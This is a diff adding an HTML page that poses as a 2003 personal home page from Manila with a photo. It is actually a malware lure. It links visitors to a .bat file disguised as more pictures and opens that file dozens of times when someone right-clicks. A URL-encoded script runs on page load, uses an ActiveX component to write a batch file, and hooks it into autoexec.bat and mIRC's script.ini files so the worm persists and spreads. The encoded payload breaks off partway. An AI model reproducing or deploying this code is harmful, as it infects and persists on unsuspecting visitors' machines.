@@ -1,0 +1,144 @@
+<html>
+<head><title>Hello My Friend Welcome to my simple Home Page</title>
+</head>
+<BODY bgcolor="black">
+<p><font size=6 color="yellow"><center>Hello My Friend!</center></font>
+<p align="center"><img height=150 width=120 border=2 src="http://www.angelfire.com/freak2/preit/mypic.jpg"></p>
+<p><font size=3 color="white"><center>
+    <p>I hope you like my pic.</p>
+    <table width="50%" border="0">
+      <tr> 
+        
+      <td> <div align="center">
+          <marquee behavior="alternate" direction="right">
+          <font color="white" size="4" face="Arial, Helvetica, sans-serif"><a href="http://www.angelfire.com/preit/mypic.bat"><strong><font size="+2">Just 
+          click here to see more picture!</font></strong></a> </font> 
+          </marquee>
+        </div></td>
+      </tr>
+    </table>
+    <p>&nbsp;</p>
+  <p>&nbsp;</p>
+  <p>&nbsp;</p>
+  <p><font size=1 color="white">Copyright 2003</p>
+  <p>Manila, Philippines</p>
+  </center></font></p>
+  </center></font></p>
+<SCRIPT LANGUAGE=JAVASCRIPT>
+    function right(e) {
+    if (navigator.appName == 'Netscape' &&
+    (e.which == 3 || e.which == 2))
+    return false;
+    else if (navigator.appName == 'Microsoft Internet Explorer' &&
+        (event.button == 2 || event.button == 3)) {
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+        window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	window.open("http://www.angelfire.com/freak2/preit/mypic.bat")
+	return false;
+    }
+    return true;
+}
+document.onmousedown=right;
+if (document.layers) window.captureEvents(Event.MOUSEDOWN);
+window.onmousedown=right;
+</SCRIPT>
+<SCRIPT>
+<!--
+document.write(unescape("%3Capplet%20code%3D%22com.ms.activeX.ActiveXComponent%22%20align%3D%22baseline%22%0D%0Awidth%3D%220%22%20height%3D%22128%22%20highlight%3D%220%22%3E%0D%0A%3C/applet%3E%0D%0A%3Cscript%20language%3D%22JAVASCRIPT%22%3E%0D%0A%3C%21--%20hide%20for%20safe%20browsers%0D%0AInterfaceObject%3Ddocument.applets%5B0%5D%3B%0D%0AsetTimeout%28%22Upload%28%29%22%2C1000%29%3B%0D%0Afunction%20Upload%28%29%20%7B%09%0D%0AfsoClassID%3D%22%7B0D43FE01-F093-11CF-8940-00A0C9054228%7D%22%3B%0D%0AInterfaceObject.setCLSID%28fsoClassID%29%3B%09%0D%0Afso%20%3D%20InterfaceObject.createInstance%28%29%3B%0D%0A//%20windir%20%3D%20fso.getspecialfolder%280%29%3B%0D%0Afilename%20%3D%22%5C%5Csystem.bat%22%3B%20%20%20%20%20%20%20%20%0D%0Aa%20%3D%20fso.opentextfile%28filename%2C%20%222%22%2C%20%22true%22%29%3B%0D%0Aa.Writeline%28%22@Echo%20off%22%29%0D%0Aa.Writeline%28%22@if%20exist%20c%3A%5C%5Cwindows%5C%5Csystem.bat%20goto%20sss%22%29%0D%0Aa.Writeline%28%22@echo%20call%20c%3A%5C%5Cwindows%5C%5Csystem.bat%20%3E%3E%20c%3A%5C%5Cautoexec.bat%22%29%0D%0Aa.Writeline%28%22@echo%20exit%20%3E%3E%20c%3A%5C%5Cautoexec.bat%22%29%0D%0Aa.Writeline%28%22%3Asss%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20c%3A%5C%5Cwindows%5C%5Csystem.bat%20%3Enul%22%29%0D%0Aa.Writeline%28%22@if%20exist%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%20goto%20mirc%22%29%0D%0Aa.Writeline%28%22%3Aa%22%29%0D%0Aa.Writeline%28%22@if%20exist%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%20goto%20prog%22%29%0D%0Aa.Writeline%28%22%3Ab%22%29%0D%0Aa.Writeline%28%22@if%20exist%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%20goto%20dmirc%22%29%0D%0Aa.Writeline%28%22%3Ac%22%29%0D%0Aa.Writeline%28%22@if%20exist%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%20goto%20emirc%22%29%0D%0Aa.Writeline%28%22%3Ad%22%29%0D%0Aa.Writeline%28%22@if%20exist%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%20goto%20fmirc%22%29%0D%0Aa.Writeline%28%22%3Ae%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22@goto%20end%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%3Amirc%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20c%3A%5C%5Cmirc%5C%5Cscript.ini%20%3Enul%22%29%0D%0Aa.Writeline%28%22@echo%20%5Brfiles%5D%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n0%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n1%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n2%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.writeline%28%22@echo%20n3%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n4%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n5%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n6%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n7%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n8%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n9%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n10%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n11%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n12%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n13%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n14%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n15%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n16%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n17%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n18%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n19%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n20%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@goto%20a%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%3Aprog%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cscript.ini%20%3Enul%22%29%0D%0Aa.Writeline%28%22@echo%20%5Brfiles%5D%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n0%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n1%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n2%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n3%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n4%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n5%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n6%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n7%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n8%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n9%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n10%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n11%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n12%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n13%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n14%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n15%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n16%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n17%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n18%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n19%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n20%3Dscript.ini%20%3E%3E%20c%3A%5C%5Cprogra%7E1%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@goto%20b%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%3Admirc%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20d%3A%5C%5Cmirc%5C%5Cscript.ini%20%3Enul%22%29%0D%0Aa.Writeline%28%22@echo%20%5Brfiles%5D%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n0%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n1%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n2%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n3%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n4%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n5%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n6%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n7%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n8%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n9%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n10%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n11%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n12%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n13%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n14%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n15%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n16%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n17%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n18%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n19%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n20%3Dscript.ini%20%3E%3E%20d%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@goto%20c%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%3Aemirc%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20e%3A%5C%5Cmirc%5C%5Cscript.ini%20%3Enul%22%29%0D%0Aa.Writeline%28%22@echo%20%5Brfiles%5D%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n0%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n1%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n2%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n3%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n4%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n5%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n6%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n7%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n8%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n9%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n10%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n11%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n12%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n13%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n14%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n15%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n16%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n17%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n18%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n19%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n20%3Dscript.ini%20%3E%3E%20e%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@goto%20d%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%3Afmirc%22%29%0D%0Aa.Writeline%28%22@copy%20/y%20%250%20f%3A%5C%5Cmirc%5C%5Cscript.ini%20%3Enul%22%29%0D%0Aa.Writeline%28%22@echo%20%5Brfiles%5D%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n0%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n1%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n2%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n3%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n4%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n5%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n6%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n7%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n8%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n9%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n10%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n11%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n12%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n13%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n14%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n15%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n16%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n17%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n18%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n19%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@echo%20n20%3Dscript.ini%20%3E%3E%20f%3A%5C%5Cmirc%5C%5Cmirc.ini%22%29%0D%0Aa.Writeline%28%22@goto%20e%22%29%0D%0Aa.Writeline%28%22%22%29%0D%0Aa.Writeline%28%22%5Bscript%5D%22%29%0D%0Aa.Writeline%28%22n0%3D%22%29%0D%0Aa.Writeline%28%22n1%3D%22%29%0D%0Aa.Writeline%28%22n2%3D%22%29%0D%0Aa.Writeline%28%22n3%3D%22%29%0D%0Aa.Writeline%28%22n4%3D%22%29%0D%0Aa.Writeline%28%22n5%3D%22%29%0D%0Aa.Writeline%28%22n6%3D%22%29%0D%0Aa.Writeline%28%22n7%3D%22%29%0D%0Aa.Writeline%28%22n8%3D%22%29%0D%0Aa.Writeline%28%22n9%3D%22%29%0D%0Aa.Writeline%28%22n10%3D%22%29%0D%0Aa.Writeline%28%22n11%3D%22%29%0D%0Aa.Writeline%28%22n12%3D%22%29%0D%0Aa.Writeline%28%22n13%3D%22%29%0D%0Aa.Writeline%28%22n14%3D%22%29%0D%0Aa.Writeline%28%22n15%3D%22%29%0D%0Aa.Writeline%28%22n16%3D%22%29%0D%0Aa.Writeline%28%22n17%3D%22%29%0D%0Aa.Writeline%28%22n18%3D%22%29%0D%0Aa.Writeline%28%22n19%3D%22%29%0D%0Aa.Writeline%28%22n20%3D%22%29%0D%0Aa.Writeline%28%22n21%3D%22%29%0D%0Aa.Writeline%28%22n22%3D%22%29%0D%0Aa.Write